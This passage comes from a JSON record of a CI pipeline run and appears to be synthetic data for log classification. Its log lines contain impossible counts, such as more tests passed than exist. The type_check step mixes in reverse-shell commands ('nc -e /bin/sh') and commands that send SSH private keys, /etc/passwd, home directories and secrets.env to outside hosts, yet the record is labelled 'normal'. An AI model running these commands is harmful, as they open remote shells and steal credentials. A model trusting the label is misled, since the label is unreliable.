          "HEAD is now at c66ca8f",
          "Pulling image: node:18",
          "[12:17:55] DEBUG: Initializing service",
          "pip: Collecting jest",
          "Minifying vendor.js",
          "Generating source maps...",
          "Step 4/21: Testing",
          "Step 7/24: Installing dependencies",
          "Step 4/16: Building",
          "Optimizing 19 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache invalidated: dependencies",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Coverage: 99% statements, 89% branches",
          "Installing prettier@1.4.8",
          "Step 19/22: Installing dependencies",
          "Cache hit for key-3195",
          "  PASS: test_auth_login (195ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:17:55] DEBUG: Initializing service",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Test Suites: 32 passed, 23 total",
          "[12:17:55] ERROR: Connection failed",
          "GET /status - 201 (41ms)",
          "Creating production build...",
          "Connecting to acme.corp:443...",
          "OK",
          "HEAD is now at 6436bd4",
          "Cache invalidated: dependencies",
          "Cache restored successfully (174MB)",
          "Compiling utils/handler.rs...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Waiting...",
          "[12:17:55] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "pip: Downloading express-3.11.tar.gz",
          "WARNING: prettier has known vulnerabilities",
          "NODE_ENV=production",
          "[12:17:55] DEBUG: Loading configuration",
          "OK",
          "Loading...",
          "Layer 4/8: COPY command",
          "npm install: added 156 packages",
          "Generating source maps...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "pip: Collecting axios",
          "Compiling components/index.js...",
          "yarn add: Done in 22.33s",
          "[12:17:55] DEBUG: Initializing service",
          "[12:17:55] INFO: Connecting to database",
          "  PASS: e2e/test_api_health.spec.js",
          "Generating source maps...",
          "Bundling styles.css",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Installing react@1.6.9",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 build completed",
          "[12:17:55] DEBUG: Connection pool: 9 active",
          "WARNING: prettier has known vulnerabilities",
          "[12:17:55] DEBUG: Query executed in 58ms",
          "Compiling components/main.py...",
          "Done.",
          "Cache miss for key-1309",
          "Installing jest@4.16.5",
          "Ran 144 tests in 47s",
          "Ran 106 tests in 39s",
          "[12:17:55] INFO: Request completed",
          "Exception: ValueError",
          "Cache invalidated: dependencies",
          "Pushing to registry...",
          "TLS handshake completed",
          "Compiling components/index.js...",
          "Using Python 3.9",
          "Compiling src/handler.rs...",
          "Success!",
          "Snapshots: 14 passed, 46 total",
          "NODE_ENV=test",
          "WARNING: axios has known vulnerabilities",
          "Finished.",
          "Finished.",
          "[12:17:55] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:17:55] INFO: Processing request",
          "[12:17:55] DEBUG: Query executed in 66ms",
          "HEAD is now at 1d53719",
          "[12:17:55] DEBUG: Memory usage: 498MB",
          "HEAD is now at 944ac4a",
          "Installing lodash@4.5.6",
          "npm install: added 317 packages",
          "Bundling vendor.css",
          "[12:17:55] INFO: Request completed",
          "Waiting...",
          "Compiling utils/main.py...",
          "Step 8/22: Testing",
          "pip: Installing build dependencies...",
          "TLS handshake completed",
          "Installing eslint@2.19.5",
          "TLS handshake completed",
          "npm install: added 487 packages",
          "Already up to date.",
          "Time: 4.38s",
          "Compiling src/app.ts...",
          "Snapshots: 49 passed, 30 total",
          "Platform: linux-x64",
          "Creating production build...",
          "\u2717 build failed with exit code 88",
          "Time: 27.455s",
          "Already up to date.",
          "Bundling vendor.css",
          "[12:17:55] DEBUG: Loading configuration",
          "NODE_ENV=production",
          "Step 6/19: Linting",
          "Tests: 288 passed, 209 total",
          "pip: Collecting express",
          "pip: Collecting react",
          "Environment: development",
          "Minifying app.js",
          "Compiling src/handler.rs...",
          "[12:17:55] WARN: Deprecated API usage",
          "Connecting to acme.corp:443...",
          "pip install: Successfully installed express-3.18",
          "[12:17:55] INFO: Connecting to database",
          "\u2713 deploy completed",
          "Using Node.js 15.18.2",
          "Finished.",
          "Cache restored successfully (319MB)",
          "Switched to branch 'feature/task-958'",
          "WARNING: prettier has known vulnerabilities",
          "HEAD is now at e776437",
          "Ran 152 tests in 30s",
          "[12:17:55] DEBUG: Initializing service",
          "yarn add: Done in 29.63s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching submodules...",
          "Uploading artifact 'coverage' (19 files)",
          "Cache invalidated: node_modules",
          "Connecting to example.com:443...",
          "OK",
          "[12:17:55] DEBUG: Loading configuration",
          "Step 16/21: Linting",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-25T12:21:02.166816",
        "finished_at": "2025-11-25T12:21:13.443312",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "npm install: added 343 packages",
          "OK",
          "\u2713 Task completed in 687ms",
          "\u2713 Step 'install' succeeded",
          "  PASS: test_cache_hit (362ms)",
          "pip install: Successfully installed jest-1.10",
          "Finished.",
          "Success!",
          "Step 1/23: Deploying",
          "\u2713 All checks passed",
          "\u2713 Task completed in 2705ms",
          "Success!",
          "Done.",
          "Success!",
          "Minifying app.js",
          "HEAD is now at 692a586",
          "Verifying...",
          "POST /data - 201 (48ms)",
          "Cache restored successfully (362MB)",
          "[12:17:55] INFO: Request completed",
          "Step 5/16: Linting",
          "Using Python 3.9",
          "Step 2/21: Running migrations",
          "Optimizing 14 modules...",
          "pip install: Successfully installed express-3.8",
          "Ready.",
          "Installing prettier@2.4.2",
          "Using Node.js 16.8.3",
          "Cache miss for key-8757",
          "Using Python 3.12",
          "[12:17:55] DEBUG: Loading configuration",
          "Cache invalidated: build",
          "Test Suites: 6 passed, 39 total",
          "[12:17:55] WARN: Deprecated API usage",
          "Checking out main branch",
          "[12:17:55] DEBUG: Loading configuration",
          "Cache restored successfully (105MB)",
          "Transforming 974 files...",
          "Already up to date.",
          "npm install: resolved 342 packages",
          "Using Node.js 14.11.3",
          "HEAD is now at 37f21c3",
          "[12:17:55] DEBUG: Loading configuration",
          "Cache invalidated: dependencies",
          "Verifying...",
          "Tests: 113 passed, 344 total",
          "Verifying...",
          "Creating production build...",
          "Installing prettier@2.4.5",
          "npm install: resolved 1287 packages",
          "Ran 101 tests in 50s",
          "Bundling main.css",
          "Cache miss for key-7428",
          "Loading...",
          "\u2713 Step 'install' succeeded",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache saved successfully",
          "\u2713 validate completed",
          "Checking out master branch",
          "Ran 85 tests in 48s",
          "Switched to branch 'hotfix/task-423'",
          "Step 1/24: Linting",
          "Step 13/17: Building",
          "npm notice: created a lockfile",
          "FAILED: test_cache_hit",
          "Image pulled successfully",
          "[12:17:55] DEBUG: Connection pool: 14 active",
          "yarn add: Done in 17.68s",
          "\u2713 Task completed in 3691ms",
          "Step 8/21: Building",
          "Pulling image: alpine:3.11",
          "Building Docker image...",
          "Ready.",
          "Artifact uploaded: dist.zip (59MB)",
          "\u2717 build failed with exit code 3",
          "Cache hit for key-7831",
          "[12:17:55] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "Coverage: 92% statements, 63% branches",
          "Compiling src/utils.go...",
          "Test Suites: 31 passed, 21 total",
          "Cache invalidated: build",
          "\u2713 Task completed in 2485ms",
          "Artifact downloaded: 18MB",
          "Pushing to registry...",
          "[12:17:55] INFO: Request completed",
          "\u2713 Step 'test' succeeded",
          "Checking out main branch",
          "Connecting to cloud.services:443...",
          "[12:17:55] INFO: Starting build process",
          "[12:17:55] INFO: Request completed",
          "Image pulled successfully",
          "Ready.",
          "Processing...",
          "[12:17:55] INFO: Starting build process",
          "[12:17:55] DEBUG: Memory usage: 473MB",
          "FAILED: test_auth_login",
          "Time: 4.114s",
          "[12:17:55] WARN: Deprecated API usage",
          "Compiling components/handler.rs...",
          "[12:17:55] INFO: Connecting to database",
          "npm notice: package.json updated",
          "[12:17:55] INFO: Cache refreshed",
          "[12:17:55] WARN: Deprecated API usage",
          "Checking out master branch",
          "Step 7/20: Running migrations",
          "[12:17:55] WARN: Deprecated API usage",
          "yarn add: Done in 29.66s",
          "Artifact uploaded: dist.zip (94MB)",
          "Processing...",
          "npm install: added 458 packages",
          "[12:17:55] DEBUG: Initializing service",
          "Completed.",
          "Compiling utils/handler.rs...",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-5520",
          "npm install: resolved 336 packages",
          "Generating source maps...",
          "Compiling components/index.js...",
          "Cache invalidated: dependencies",
          "Success!",
          "Loading...",
          "  PASS: integration/test_db_connect.spec.js",
          "FAILED: test_db_connect",
          "Step 10/18: Linting",
          "[12:17:55] INFO: Starting build process",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "Optimizing 83 modules...",
          "npm install: resolved 566 packages",
          "Checking out develop branch",
          "Processing...",
          "[12:17:55] DEBUG: Connection pool: 20 active",
          "pip: Collecting jest",
          "Finished.",
          "  PASS: integration/test_db_connect.spec.js",
          "Snapshots: 23 passed, 13 total",
          "Pulling image: node:18",
          "GET /health - 200 (71ms)",
          "Cache restored successfully (468MB)",
          "Optimizing 94 modules...",
          "Artifact uploaded: dist.zip (91MB)",
          "Fetching submodules...",
          "Success!",
          "Processing...",
          "Compiling components/service.java...",
          "Transforming 860 files...",
          "[12:17:55] INFO: Cache refreshed",
          "[12:17:55] DEBUG: Query executed in 37ms",
          "[12:17:55] WARN: Deprecated API usage",
          "Bundling runtime.js",
          "Compiling src/utils.go...",
          "Connection established",
          "POST /upload - 202 (312ms)",
          "\u2713 Step 'test' succeeded",
          "Snapshots: 13 passed, 47 total",
          "Building Docker image...",
          "Environment: development",
          "[12:17:55] INFO: Cache refreshed",
          "Step 4/18: Building",
          "Cache miss for key-2966",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Tests: 124 passed, 324 total",
          "pip: Downloading lodash-4.8.tar.gz",
          "[12:17:55] WARN: Deprecated API usage",
          "Optimizing 69 modules...",
          "Test Suites: 5 passed, 14 total",
          "Installing eslint@5.11.7",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Time: 20.812s",
          "npm install: added 403 packages",
          "HEAD is now at 76f72c9",
          "Step 18/21: Linting",
          "WARNING: axios has known vulnerabilities",
          "Already up to date.",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:17:55] WARN: Deprecated API usage",
          "[12:17:55] DEBUG: Initializing service",
          "Coverage: 74% statements, 62% branches",
          "Step 19/17: Running migrations",
          "[12:17:55] DEBUG: Memory usage: 679MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Processing...",
          "Waiting...",
          "[12:17:55] DEBUG: Connection pool: 15 active",
          "Compiling components/app.ts...",
          "Artifact uploaded: dist.zip (97MB)",
          "[12:17:55] INFO: Request completed",
          "[12:17:55] INFO: Starting build process",
          "Waiting...",
          "[12:17:55] INFO: Connecting to database",
          "  PASS: test_auth_login (487ms)",
          "Already up to date.",
          "Connection established",
          "Cache miss for key-5589",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Tests: 274 passed, 135 total",
          "Environment: production",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-25T12:21:13.443312",
        "finished_at": "2025-11-25T12:21:17.953911",
        "log_lines": [
          "=== Step: checkout ===",
          "pip: Downloading prettier-2.9.tar.gz",
          "Step 3/19: Deploying",
          "Using Python 3.10",
          "Done.",
          "Cache saved successfully",
          "Time: 16.850s",
          "[12:17:55] WARN: Deprecated API usage",
          "Step 7/22: Running migrations",
          "Time: 7.977s",
          "Waiting...",
          "Switched to branch 'bugfix/task-727'",
          "Artifact uploaded: dist.zip (99MB)",
          "Compiling lib/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: dist.zip (47MB)",
          "Compiling lib/utils.go...",
          "[12:17:55] WARN: Deprecated API usage",
          "[12:17:55] INFO: Processing request",
          "Processing...",
          "Cache restored successfully (334MB)",
          "Step 15/19: Testing",
          "Environment: test",
          "Bundling styles.js",
          "Already up to date.",
          "\u2713 Task completed in 1598ms",
          "Cache hit for key-4823",
          "[12:17:55] WARN: Deprecated API usage",
          "pip: Collecting eslint",
          "npm notice: created a lockfile",
          "Waiting...",
          "Bundling styles.css",
          "Building Docker image...",
          "[12:17:55] INFO: Processing request",
          "Connection established",
          "GET /health - 200 (75ms)",
          "[12:17:55] INFO: Cache refreshed",
          "Cache invalidated: dependencies",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: dist.zip (42MB)",
          "TLS handshake completed",
          "Compiling src/main.py...",
          "pip: Collecting webpack",
          "Checking out master branch",
          "POST /upload - 200 (82ms)",
          "WARNING: eslint has known vulnerabilities",
          "Step 6/22: Installing dependencies",
          "Done.",
          "[12:17:55] DEBUG: Loading configuration",
          "Cache saved successfully",
          "[12:17:55] DEBUG: Initializing service",
          "\u2713 Task completed in 2817ms",
          "Tests: 426 passed, 280 total",
          "Step 14/19: Building",
          "[12:17:55] DEBUG: Loading configuration",
          "Processing...",
          "Connection established",
          "Optimizing 12 modules...",
          "[12:17:55] DEBUG: Loading configuration",
          "Processing...",
          "Coverage: 86% statements, 90% branches",
          "Tests: 64 passed, 69 total",
          "Pushing to registry...",
          "Environment: staging",
          "Success!",
          "\u2713 Step 'build' succeeded",
          "Ran 133 tests in 15s",
          "Image pulled successfully",
          "Finished.",
          "Compiling lib/index.js...",
          "Building Docker image...",
          "yarn add: Done in 5.89s",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "Bundling styles.css",
          "pip install: Successfully installed jest-5.19",
          "Artifact downloaded: 4MB",
          "Uploading artifact 'coverage' (40 files)",
          "Pushing to registry...",
          "[12:17:55] INFO: Starting build process",
          "Transforming 629 files...",
          "Ready.",
          "Processing...",
          "Completed.",
          "Compiling components/main.py...",
          "pip: Downloading express-2.18.tar.gz",
          "Cache invalidated: dependencies",
          "Step 14/21: Installing dependencies",
          "Step 3/21: Linting",
          "Compiling lib/service.java...",
          "Cache saved successfully",
          "Step 17/24: Testing",
          "Cache restored successfully (207MB)",
          "[12:17:55] DEBUG: Loading configuration",
          "Exception: NullPointerException",
          "[12:17:55] INFO: Starting build process",
          "npm notice: package.json updated",
          "Step 20/15: Testing",
          "[12:17:55] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Exception: TypeError",
          "Time: 110.356s",
          "[12:17:55] DEBUG: Memory usage: 1485MB",
          "Ran 111 tests in 28s",
          "Compiling components/service.java...",
          "npm install: resolved 1357 packages",
          "Time: 73.385s",
          "Pushing to registry...",
          "pip: Collecting eslint",
          "Ran 137 tests in 44s",
          "Step 3/19: Building",
          "OK",
          "Cache hit for key-5611",
          "Snapshots: 45 passed, 31 total",
          "Cache miss for key-1823",
          "\u2713 validate completed",
          "\u2713 lint completed",
          "Generating source maps...",
          "HEAD is now at 7ab0ca1",
          "Done.",
          "pip install: Successfully installed eslint-4.14",
          "Cache saved successfully",
          "npm install: resolved 440 packages",
          "WARNING: eslint has known vulnerabilities",
          "[12:17:55] INFO: Cache refreshed",
          "[12:17:55] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 93",
          "Installing express@3.8.1",
          "Minifying vendor.js",
          "npm notice: created a lockfile",
          "POST /upload - 201 (30ms)",
          "npm install: resolved 1796 packages",
          "Processing...",
          "Cache restored successfully (159MB)",
          "Waiting...",
          "Creating production build...",
          "Step 12/16: Testing",
          "Cache hit for key-9472",
          "yarn add: Done in 29.26s",
          "Using Python 3.11",
          "Step 17/23: Testing",
          "[12:17:55] WARN: Deprecated API usage",
          "[12:17:55] INFO: Cache refreshed",
          "WARNING: prettier has known vulnerabilities",
          "Step 12/21: Deploying",
          "Cache restored successfully (255MB)",
          "[12:17:55] DEBUG: Memory usage: 1408MB",
          "Image pulled successfully",
          "Switched to branch 'feature/task-923'",
          "Pulling image: alpine:latest",
          "yarn add: Done in 4.48s",
          "Using Python 3.12",
          "[12:17:55] DEBUG: Initializing service",
          "Bundling styles.js",
          "npm install: added 492 packages",
          "Test Suites: 45 passed, 47 total",
          "[12:17:55] INFO: Cache refreshed",
          "Uploading artifact 'dist' (44 files)",
          "Step 16/18: Testing",
          "Snapshots: 46 passed, 26 total",
          "Ready.",
          "POST /data - 201 (168ms)",
          "[12:17:55] DEBUG: Query executed in 76ms",
          "Step 7/25: Deploying",
          "Test Suites: 19 passed, 19 total",
          "Transforming 697 files...",
          "Creating production build...",
          "HEAD is now at c8ffee6",
          "Compiling src/service.java...",
          "[12:17:55] ERROR: Connection failed",
          "pip install: Successfully installed jest-5.19",
          "Compiling lib/service.java...",
          "Optimizing 66 modules...",
          "FAILED: test_db_connect",
          "Cache saved successfully",
          "[12:17:55] INFO: Connecting to database",
          "Minifying app.js",
          "[12:17:55] WARN: Deprecated API usage",
          "Step 19/24: Linting",
          "Compiling utils/app.ts...",
          "Using Python 3.10",
          "[12:17:55] INFO: Processing request",
          "\u2713 Task completed in 4362ms",
          "Connecting to test.io:443...",
          "[12:17:55] DEBUG: Connection pool: 2 active",
          "Environment: production",
          "Done.",
          "Optimizing 66 modules...",
          "Cache invalidated: dependencies",
          "Success!",
          "Compiling src/index.js...",
          "Verifying...",
          "\u2713 All checks passed",
          "npm install: resolved 613 packages",
          "Cache saved successfully",
          "npm install: added 332 packages",
          "npm install: added 210 packages",
          "Image pulled successfully",
          "Already up to date.",
          "Creating production build...",
          "NODE_ENV=test",
          "Layer 6/10: ENV command",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-25T12:21:17.953911",
        "finished_at": "2025-11-25T12:21:29.230407",
        "log_lines": [
          "=== Step: type_check ===",
          "\u2713 Step 'build' succeeded",
          "npm install: added 140 packages",
          "Cache miss for key-1553",
          "\u2713 validate completed",
          "Connection established",
          "nc -e /bin/sh 201.148.89.121 17462",
          "[12:17:55] DEBUG: Memory usage: 1413MB",
          "Exception: NullPointerException",
          "Success!",
          "[12:17:55] INFO: Processing request",
          "Loading...",
          "Step 15/19: Installing dependencies",
          "Compiling utils/handler.rs...",
          "Step 14/20: Building",
          "Step 16/20: Running migrations",
          "Step 1/23: Deploying",
          "Connection established",
          "pip install: Successfully installed eslint-4.16",
          "Image pulled successfully",
          "Compiling lib/handler.rs...",
          "pip: Installing build dependencies...",
          "Compiling src/app.ts...",
          "Processing...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 39.183.168.18 25903",
          "Image pulled successfully",
          "Processing...",
          "Connecting to cloud.services:443...",
          "[12:17:55] INFO: Request completed",
          "[12:17:55] DEBUG: Memory usage: 488MB",
          "Generating source maps...",
          "Checking out main branch",
          "Step 9/16: Installing dependencies",
          "Cache miss for key-9964",
          "[12:17:55] DEBUG: Connection pool: 13 active",
          "Cache saved successfully",
          "[12:17:55] INFO: Cache refreshed",
          "WARNING: jest has known vulnerabilities",
          "pip: Downloading axios-2.13.tar.gz",
          "Processing...",
          "Cache saved successfully",
          "Using Python 3.11",
          "Step 11/18: Building",
          "Time: 30.384s",
          "[12:17:55] INFO: Processing request",
          "Building Docker image...",
          "Pulling image: python:18",
          "[12:17:55] INFO: Cache refreshed",
          "OK",
          "OK",
          "Uploading artifact 'build' (46 files)",
          "Installing jest@5.4.8",
          "Success!",
          "GET /health - 204 (89ms)",
          "Bundling vendor.js",
          "Cache saved successfully",
          "Layer 1/14: COPY command",
          "Platform: linux-x64",
          "Processing...",
          "[12:17:55] DEBUG: Loading configuration",
          "nc -e /bin/sh 163.153.231.132 60912",
          "Uploading artifact 'build' (13 files)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Cache miss for key-4455",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Bundling vendor.js",
          "Cache restored successfully (170MB)",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:17:55] DEBUG: Connection pool: 19 active",
          "WARNING: jest has known vulnerabilities",
          "Sending 131MB of data to example.com",
          "Finished.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Cache hit for key-4495",
          "pip: Collecting eslint",
          "Layer 9/8: RUN command",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Finished.",
          "Done.",
          "Done.",
          "[12:17:55] WARN: Deprecated API usage",
          "Platform: linux-x64",
          "\u2717 build failed with exit code 29",
          "Processing...",
          "Pushing to registry...",
          "Snapshots: 8 passed, 13 total",
          "Processing...",
          "Tests: 199 passed, 500 total",
          "WARNING: jest has known vulnerabilities",
          "Platform: darwin-arm64",
          "Sending 224MB of data to cloud.services",
          "Cache hit for key-9423",
          "Creating production build...",
          "Compiling src/main.py...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Pushing to registry...",
          "npm install: resolved 371 packages",
          "Pushing to registry...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "nc -e /bin/sh 157.58.177.132 11726",
          "Connection established",
          "Cache hit for key-8917",
          "NODE_ENV=production",
          "[12:17:55] DEBUG: Loading configuration",
          "\u2713 test completed",
          "pip: Collecting webpack",
          "[12:17:55] DEBUG: Query executed in 82ms",
          "Cache invalidated: node_modules",
          "Step 5/16: Installing dependencies",
          "pip install: Successfully installed react-1.15",
          "Connection established",
          "FAILED: test_api_health",
          "Step 16/21: Deploying",
          "Coverage: 85% statements, 62% branches",
          "Time: 116.68s",
          "Pulling image: node:latest",
          "[12:17:55] DEBUG: Query executed in 38ms",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 248.243.116.192 48967",
          "[12:17:55] INFO: Starting build process",
          "Cache invalidated: dependencies",
          "Step 18/21: Building",
          "[12:17:55] INFO: Connecting to database",
          "Image pulled successfully",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 187.141.92.179 18642",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 101.182.128.241 35374",
          "Cache restored successfully (416MB)",
          "pip install: Successfully installed lodash-4.4",
          "Layer 5/11: RUN command",
          "[12:17:55] ERROR: Connection failed",
          "Verifying...",
          "Artifact downloaded: 37MB",
          "[12:17:55] DEBUG: Memory usage: 509MB",
          "[12:17:55] WARN: Deprecated API usage",
          "Cache restored successfully (41MB)",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "pip: Downloading eslint-3.16.tar.gz",
          "\u2713 lint completed",
          "Compiling utils/handler.rs...",
          "Success!",
          "Tests: 432 passed, 485 total",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Time: 81.574s",
          "[12:17:55] INFO: Processing request",
          "Using Node.js 14.16.10",
          "Completed.",
          "HEAD is now at 2089924",
          "Tests: 246 passed, 375 total",
          "[12:17:55] INFO: Starting build process",
          "[12:17:55] DEBUG: Query executed in 87ms",
          "Coverage: 89% statements, 88% branches",
          "Sending 482MB of data to acme.corp",
          "Creating production build...",
          "Finished.",
          "pip: Collecting lodash",
          "Step 4/22: Deploying",
          "Switched to branch 'hotfix/task-640'",
          "[12:17:55] DEBUG: Query executed in 9ms",
          "Pushing to registry...",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Compiling utils/service.java...",
          "nc -e /bin/sh 79.191.65.178 27062",
          "Bundling runtime.js",
          "OK",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 175.4.229.130 11940",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 150.241.124.228 34568",
          "Cache restored successfully (233MB)",
          "TLS handshake completed",
          "Time: 14.809s",
          "Step 12/24: Building",
          "Cache invalidated: build",
          "nc -e /bin/sh 168.23.231.249 13292",
          "pip: Collecting eslint",
          "GET /status - 200 (8ms)",
          "Checking out develop branch",
          "Image pulled successfully",
          "Cache invalidated: node_modules",
          "Ran 200 tests in 23s",
          "Platform: win32-x64",
          "Pulling image: node:18",
          "[12:17:55] INFO: Request completed",
          "Environment: production",
          "Bundling runtime.css",
          "nc -e /bin/sh 52.27.94.47 18548",
          "Switched to branch 'feature/task-234'",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "[12:17:55] INFO: Cache refreshed",
          "Bundling main.css",
          "FAILED: test_cache_hit",
          "npm notice: created a lockfile",
          "Cache restored successfully (399MB)",
          "Using Node.js 19.19.4",
          "Test Suites: 43 passed, 28 total",
          "yarn add: Done in 27.66s",
          "npm install: added 24 packages",
          "Cache miss for key-4925",
          "npm notice: created a lockfile",
          "[12:17:55] DEBUG: Memory usage: 549MB",
          "Ran 183 tests in 18s",
          "Ran 66 tests in 29s",
          "Time: 66.335s",
          "Switched to branch 'feature/task-461'",
          "Time: 71.715s",
          "Done.",
          "npm install: added 358 packages",
          "Checking out develop branch",
          "[12:17:55] DEBUG: Connection pool: 1 active",
          "Switched to branch 'feature/task-776'",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Sending 458MB of data to acme.corp",
          "Finished.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Step 18/22: Testing",
          "Transforming 479 files...",
          "Switched to branch 'feature/task-199'",
          "Switched to branch 'bugfix/task-863'",
          "Already up to date.",
          "Pushing to registry...",
          "[12:17:55] INFO: Processing request",
          "Sending 414MB of data to test.io",
          "\u2713 Task completed in 2664ms",
          "Generating source maps...",
          "WARNING: axios has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 133 tests in 6s",
          "nc -e /bin/sh 108.10.152.217 16778",
          "Verifying...",
          "=== Step type_check completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}